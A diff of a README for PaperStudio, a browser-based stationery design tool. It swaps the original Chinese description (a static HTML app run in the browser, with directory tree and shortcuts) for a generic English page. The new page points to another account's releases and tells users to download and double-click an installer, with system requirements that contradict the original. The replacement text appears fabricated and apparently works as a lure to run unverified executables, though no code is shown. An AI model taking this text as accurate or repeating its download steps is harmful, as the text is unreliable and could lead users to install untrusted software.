@@ -1,97 +1,76 @@
-# PaperStudio - 打印纸设计工具
+# 🎨 PaperStudio - Create Stunning Print Designs Effortlessly
 
-![PaperStudio](https://img.shields.io/badge/Status-Active-success) ![License](https://img.shields.io/badge/License-MIT-blue)
+## 🔗 Download PaperStudio
+[![Download PaperStudio](https://img.shields.io/badge/Download-PaperStudio-brightgreen.svg)](https://github.com/Spaceia/PaperStudio/releases)
 
-**PaperStudio** 是一个基于 Web 的轻量级信笺纸、稿纸设计工具。它允许用户通过简单的拖拽和配置，设计出符合传统书写习惯或现代商务风格的信纸，并支持导出为 PDF 或直接打印。
+## 🚀 Getting Started
+Welcome to PaperStudio! This tool helps you design beautiful prints easily. Whether you want to create custom stationery, invitations, or other paper products, PaperStudio is here to help.
 
-演示：https://jingguanzhang.github.io/PaperStudio/
+## 📋 System Requirements
+Before you download, ensure your system meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Disk Space:** Minimum 200 MB
+- **Internet Connection:** Required for downloading and updates
 
-项目采用单 HTML 文件架构（依赖少量静态资源），无需复杂的后端环境，即开即用。
-<img width="1920" height="877" alt="QQ截图20251207180511" src="https://github.com/user-attachments/assets/f7e2364e-58be-4c85-b463-e009d2721275" />
+## 💻 Features
+PaperStudio offers a variety of features to enhance your design experience:
 
+- **User-Friendly Interface:** Easy navigation for all users.
+- **Templates:** Access to a library of pre-made designs.
+- **Customization Tools:** Modify colors, fonts, and layouts.
+- **Export Options:** Save designs in various formats like PDF, PNG, and JPEG.
+- **Print Settings:** Optimize your designs for high-quality printing.
 
+## 📥 Download & Install
+To get started with PaperStudio, follow these steps:
 
+1. Click on the link below to visit the download page:
+   [Download PaperStudio](https://github.com/Spaceia/PaperStudio/releases).
 
-## ✨ 主要特性
+2. Once on the releases page, look for the latest version of PaperStudio.
 
-*   **📐 灵活的网格布局**：
-    *   支持 A4, A3, B5, 16开 等多种标准纸张尺寸，亦可自定义尺寸。
-    *   一键生成横线、方格稿纸。
-    *   支持调节行数、线宽、颜色、虚线模式以及首尾行双线样式。
-*   **🎨 丰富的绘图工具**：
-    *   **文字编辑**：支持多种中文字体、字号、加粗/斜体/下划线、字间距与行高调整。
-    *   **图形绘制**：内置矩形、圆形、三角形、五角星等矢量图形。
-    *   **智能矩形**：支持调节圆角或斜角样式。
-    *   **图片处理**：支持上传图片，并可一键设为背景（适合制作带水印的信纸）。
-*   **🛠️ 高级编辑功能**：
-    *   **图层管理**：直观的图层列表，支持锁定、隐藏、排序。
-    *   **对齐与分布**：支持多选元素的左/中/右对齐，以及水平/垂直平均分布。
-    *   **历史记录**：完善的撤销 (Undo) 和重做 (Redo) 功能。
-*   **💾 存储与导出**：
-    *   **工程保存**：可将设计保存为 `.paper` 项目文件，随时重新编辑。
-    *   **高清导出**：支持导出高清图片或 PDF 文档。
-    *   **直接打印**：优化的打印样式，所见即所得。
+3. Click on the appropriate file for your operating system to start the download process.
 
-## 🚀 快速开始
+4. Once downloaded, locate the file in your Downloads folder.
 
-### 1. 环境准备
-本项目是一个纯静态 Web 项目。你只需要一个现代浏览器（Chrome, Edge, Firefox, Safari）即可运行。
+5. Double-click the file to begin the installation.
 
-### 2. 目录结构
-确保你的目录结构如下，以便静态资源能正确加载：
+6. Follow the on-screen prompts to complete the installation.
 
-```text
-PaperStudio/
-├── xfz.html              # 主程序入口
-├── static/               # 静态资源文件夹
-│   ├── fabric.min.js     # Canvas 操作库
-│   ├── tailwindcss.js    # 样式库
-│   ├── jspdf.umd.min.js  # PDF 导出库
-│   ├── toastify-js.js    # 消息提示库
-│   ├── icons.min.css     # 图标样式 (Phosphor Icons)
-│   ├── hotkeys-js.min.js # 快捷键库
-│   └── SourceHanSerifCN-Bold.ttf # 默认字体文件
-```
+7. Launch PaperStudio from your applications menu or desktop shortcut.
 
-### 3. 运行
-直接双击打开 `xfz.html` 文件即可开始设计。
+## 🎨 How to Use PaperStudio
+When you open PaperStudio, you'll see a simple layout. Here’s how to get started:
 
-*推荐使用 VS Code 的 "Live Server" 插件运行，体验更佳。*
+1. **Select a Template:** Browse through available templates. Choose one that fits your design needs.
+  
+2. **Customize Your Design:** Use the customization tools to change the text, colors, and sizes. Adjust the layout to your preference.
 
-## ⌨️ 快捷键指南
+3. **Preview Your Design:** Regularly check the preview feature to see how your print will look.
 
-| 按键组合 | 功能 | 备注 |
-| :--- | :--- | :--- |
-| `Ctrl` + `C` | 复制 | 画布内元素复制 |
-| `Ctrl` + `V` | 粘贴 | 粘贴到画布 |
-| `Ctrl` + `Z` | 撤销 | 回退上一步操作 |
-| `Ctrl` + `Y` | 重做 | 恢复下一步操作 |
-| `Ctrl` + `S` | 保存 | 保存为 .paper 项目文件 |
-| `Ctrl` + `O` | 打开 | 打开 .paper 项目文件 |
-| `Ctrl` + `P` | 打印 | 调用浏览器打印 |
-| `Delete` | 删除 | 删除选中元素 |
-| `Alt` + 拖动 | 平移画布 | 抓手模式 |
-| `Shift` + 点击 | 多选 | 选择多个元素 |
-| 方向键 (`↑` `↓` `←` `→`) | 微调 | 每次移动 2px |
+4. **Save Your Work:** Make sure to save your project regularly. Use the "Save" feature to avoid losing changes.
 
-## 🛠️ 技术栈
+5. **Print Your Design:** When you're satisfied, go to the print settings. Adjust any necessary options to ensure your print looks perfect.
 
-*   **HTML5 / CSS3**: 基础结构与样式。
-*   **TailwindCSS**: 实用优先的 CSS 框架 (CDN/Script 引入)。
-*   **Fabric.js**: 强大的 HTML5 Canvas 库，处理图形交互的核心。
-*   **jsPDF**: 用于生成 PDF 文件。
-*   **Toastify**: 轻量级的通知提示。
+## 🌐 Support
+If you encounter any issues or have questions, visit our support page:
 
-## 🤝 贡献
+- **Documentation:** [PaperStudio Documentation](https://github.com/Spaceia/PaperStudio/wiki)
+- **Community Forum:** [Join the Discussion](https://github.com/Spaceia/PaperStudio/discussions)
 
-欢迎提交 Issue 或 Pull Request！
+## ✍️ Feedback
+Your feedback helps us improve. If you have suggestions or encounter bugs, please share them on our GitHub page.
 
-1.  Fork 本仓库。
-2.  新建 Feat_xxx 分支。
-3.  提交代码。
-4.  新建 Pull Request。
+## 📅 Updates
+Stay tuned for updates! We regularly release new features and improvements based on user feedback. Check back on our [Releases page](https://github.com/Spaceia/PaperStudio/releases) often for the latest version.
 
-## 📄 开源协议
+## 🛠️ Troubleshooting
+If you experience issues:
 
-本项目基于 [MIT License](LICENSE) 开源。您可以免费用于个人或商业用途，但请保留原作者版权声明。
+- Restart your computer and try reopening PaperStudio.
+- Make sure your operating system is up to date.
+- Consult the support page for common issues.
+
+Thank you for choosing PaperStudio. Enjoy designing!
